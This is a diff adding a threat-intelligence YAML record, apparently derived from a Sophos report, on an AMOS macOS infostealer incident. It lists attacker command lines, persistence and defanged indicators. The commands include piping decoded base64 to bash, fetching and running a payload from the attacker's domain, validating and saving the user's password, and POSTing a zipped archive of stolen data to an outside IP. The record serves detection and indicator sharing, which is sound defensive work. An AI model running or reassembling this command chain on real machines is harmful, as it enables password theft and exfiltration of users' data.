@@ -1,0 +1,60 @@
+title: Sophos Managed Detection and Response (MDR) teams recently responded to a customer
+  incident involving an infostealer infection on a macOS host
+description: A variant of AMOS (Atomic macOS) infostealer was found, which accounted
+  for almost 40% of macOS protection updates in 2025.
+attribution: ''
+malware_families:
+- AMOS
+cves: []
+ttps:
+  processes: []
+  command_lines:
+  - echo <b64> | base64 -d | bash
+  - curl -fsSL hxxps://sphereou[.]com/cleanera
+  - username=$(whoami)
+  - dscl . -authonly "$username" "$password"
+  - echo -n "$password" > "/Users/$username/.pass"
+  - curl -o /tmp/update hxxps://sphereou[.]com/cleaner3/update
+  - echo "<PASSWORD>" | sudo -S xattr -c /tmp/update
+  - chmod +x /tmp/update
+  - /tmp/update
+  - whoami, id, hostname, ioreg IOPlatformUUID
+  - ditto -c -k --sequesterRsrc /tmp/91897/ /tmp/out.zip
+  - curl -X POST -F "file=@/tmp/out.zip" hxxp://38[.]244[.]158[.]56/contact
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - /tmp/update -> sphereou[.]com:443
+  - curl -> sphereou[.]com:443
+  - ditto -> sphereou[.]com:443
+  - curl -> 38[.]244[.]158[.]56:80
+  file_activity:
+  - /Users/$username/.pass
+  - /tmp/update
+  - /tmp/91897/
+  - /tmp/out.zip
+  - /Library/LaunchDaemons/com.finder.helper.plist
+  persistence:
+  - LaunchDaemon com.finder.helper.plist pointing to a hidden helper binary in the
+    user directory
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 38[.]244[.]158[.]56
+  - 45[.]94[.]47[.]204
+  domains:
+  - sphereou[.]com
+  urls:
+  - hxxps://sphereou[.]com/cleanera
+  - hxxps://sphereou[.]com/cleaner3/update
+  - hxxp://38[.]244[.]158[.]56/contact
+  - hxxp://45[.]94[.]47[.]204/api/join
+  - hxxp://45[.]94[.]47[.]204/api/tasks
+authors:
+- Jagadeesh Chandraiah
+reference: https://www.sophos.com/en-us/blog/why-amos-matters-the-macos-malware-stealing-data-at-scale
+date_of_publication: May 19, 2026
+file_creation_date: May 19, 2026
